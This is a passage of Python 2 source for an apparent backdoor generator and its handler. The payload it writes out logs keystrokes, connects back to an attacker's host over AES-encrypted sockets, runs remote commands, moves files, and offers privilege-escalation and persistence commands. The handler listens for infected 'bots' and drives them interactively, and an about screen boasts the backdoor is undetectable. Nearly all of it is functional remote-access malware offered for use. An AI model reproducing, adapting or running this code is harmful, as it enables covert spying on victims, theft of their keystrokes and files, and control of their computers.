LOG_FILENAME = 'keylog.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True		
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		cipher = AES.new(secret)
		data = Receive(s)
		if data == 'Activate':
			active = True
			Send(s, "\\n"+os.getcwd()+">")
		while active:
			data = Receive(s)
			if data == '':
				time.sleep(0.02)
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
			elif data.startswith("cd ") == True:
				try:
					os.chdir(data[3:])
					stdoutput = ""
				except:
					stdoutput = "Error opening directory.\\n"
				
			# check for download
			elif data.startswith("download") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
			
			elif data.startswith("downhttp") == True:
				# Download from url
				stdoutput = Downhttp(s, data[9:])

			# check for upload
			elif data.startswith("upload") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
				
			elif data.startswith("privs") == True:
				# Attempt to elevate privs
				stdoutput = Privs(s)
				
			elif data.startswith("persist") == True:
				# Attempt persistence
				if len(data.split(' ')) == 1: stdoutput = Persist(s)
				elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
			
			elif data.startswith("keylog") == True:
				# Begin keylogging
				if LOG_STATE == False:
					try:
						# set to True
						LOG_STATE = True
						hm = pyHook.HookManager()
						hm.KeyDown = OnKeyboardEvent
						hm.HookKeyboard()
						pythoncom.PumpMessages()
						stdoutput = "Logging keystrokes to: "+LOG_FILENAME+"...\\n"
					except:
						ctypes.windll.user32.PostQuitMessage(0)
						# set to False
						LOG_STATE = False
						stdoutput = "Keystrokes have been logged to: "+LOG_FILENAME+".\\n"
						
					
			else:
				# execute command.
				stdoutput = Exec(data)
				
			# send data
			stdoutput = stdoutput+"\\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue"""
	f.write(backdoor)
	f.close()
	print bcolors.OKGREEN + "[*] Success!" + bcolors.ENDC
	print "[*] Starting Handler..."
	
	#Handler start
	clear()
	BLOCK_SIZE=32
	PADDING = '{'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
	# clear function
	##################################
	# Windows ---------------> cls
	# Linux   ---------------> clear
	if os.name == 'posix': clf = 'clear'
	if os.name == 'nt': clf = 'cls'
	clear = lambda: os.system(clf)

	# initialize socket
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind(('0.0.0.0', int(port)))
	c.listen(128)

	# client information
	active = False
	clients = []
	socks = []
	interval = 0.8

	# Functions
	###########

	# send data
	def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
		sock.sendall(EncodeAES(cipher, cmd + end))

	# receive data
	def Receive(sock, end="EOFEOFEOFEOFEOFX"):
		data = ""
		l = sock.recv(1024)
		while(l):
			decrypted = DecodeAES(cipher, l)
			data += decrypted
			if data.endswith(end) == True:
				break
			else:
				l = sock.recv(1024)
		return data[:-len(end)]

	# download file
	def download(sock, remote_filename, local_filename=None):
		# check if file exists
		if not local_filename:
			local_filename = remote_filename
		try:
			f = open(local_filename, 'wb')
		except IOError:
			print "Error opening file.\n"
			Send(sock, "cd .")
			return
		# start transfer
		Send(sock, "download "+remote_filename)
		print "Downloading: " + remote_filename + " > " + local_filename
		fileData = Receive(sock)
		f.write(fileData)
		time.sleep(interval)
		f.close()
		time.sleep(interval)

	# upload file
	def upload(sock, local_filename, remote_filename=None):
		# check if file exists
		if not remote_filename:
			remote_filename = local_filename
		try:
			g = open(local_filename, 'rb')
		except IOError:
			print "Error opening file.\n"
			Send(sock, "cd .")
			return
		# start transfer
		Send(sock, "upload "+remote_filename)
		print 'Uploading: ' + local_filename + " > " + remote_filename
		while True:
			fileData = g.read()
			if not fileData: break
			Send(sock, fileData, "")
		g.close()

		time.sleep(interval)
		Send(sock, "")
		time.sleep(interval)
	
	# refresh clients
	def refresh():
		clear()
		print bcolors.OKGREEN + '\nListening for bots...\n' + bcolors.ENDC
		if len(clients) > 0:
			for j in range(0,len(clients)):
				print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
		else:
			print "...\n"
		# print exit option
		print "---\n"
		print bcolors.FAIL + "[0] Exit \n" + bcolors.ENDC
		print bcolors.WARNING + "\nPress Ctrl+C to interact with client." + bcolors.ENDC
		print bcolors.OKGREEN

	# main loop
	while True:
		refresh()
		# listen for clients
		try:
			# set timeout
			c.settimeout(10)
		
			# accept connection
			try:
				s,a = c.accept()
			except socket.timeout:
				continue
		
			# add socket
			if (s):
				s.settimeout(None)
				socks += [s]
				clients += [str(a)]
		
			# display clients
			refresh()
		
			# sleep
			time.sleep(interval)

		except KeyboardInterrupt:
		
			# display clients
			refresh()
		
			# accept selection --- int, 0/1-128
			activate = input("\nEnter option: ")
		
			# exit
			if activate == 0:
				print '\nExiting...\n'
				for j in range(0,len(socks)):
					socks[j].close()
				sys.exit()
		
			# subtract 1 (array starts at 0)
			activate -= 1
	
			# clear screen
			clear()
		
			# create a cipher object using the random secret
			cipher = AES.new(secret)
			print '\nActivating client: ' + clients[activate] + '\n'
			print "DOWNLOAD	Download files from Client"
			print "UPLOAD		Upload files to Client"
			print "PERSIST		Make backdoor run on startup"

			active = True
			Send(socks[activate], 'Activate')
		print bcolors.ENDC
		# interact with client
		while active:
			try:
				# receive data from client
				data = Receive(socks[activate])
			# disconnect client.
			except:
				print '\nClient disconnected... ' + clients[activate]
				# delete client
				socks[activate].close()
				time.sleep(0.8)
				socks.remove(socks[activate])
				clients.remove(clients[activate])
				refresh()
				active = False
				break

			# exit client session
			if data == 'quitted':
				# print message
				print "Exit.\n"
				# remove from arrays
				socks[activate].close()
				socks.remove(socks[activate])
				clients.remove(clients[activate])
				# sleep and refresh
				time.sleep(0.8)
				refresh()
				active = False
				break
			# if data exists
			elif data != '':
				# get next command
				sys.stdout.write(data)
				nextcmd = raw_input()
		
			# download
			if nextcmd.startswith("download ") == True:
				if len(nextcmd.split(' ')) > 2:
					download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
				else:
					download(socks[activate], nextcmd.split(' ')[1])
		
			# upload
			elif nextcmd.startswith("upload ") == True:
				if len(nextcmd.split(' ')) > 2:
					upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
				else:
					upload(socks[activate], nextcmd.split(' ')[1])
		
			# normal command
			elif nextcmd != '':
				Send(socks[activate], nextcmd)

			elif nextcmd == '':
				print 'Think before you type. ;)\n'
	
	
if user_choice=='4':
	clear()
	print "This script is coded by " + bcolors.BOLD + "Luka Sikic - 16 years old N00B ;)" + bcolors.ENDC + "\nSecret of FUD Backdoor is AES Encrypted traffic/communication between Attacker and Victim."
	print "\nContact:"
	print bcolors.HEADER + "Facebook: " + bcolors.ENDC + "facebook.com/cyber1337"
	print bcolors.HEADER + "Email: " + bcolors.ENDC + "laceratus37@gmail.com"
	print bcolors.HEADER + "Twitter: " + bcolors.ENDC + "@CroCyber"
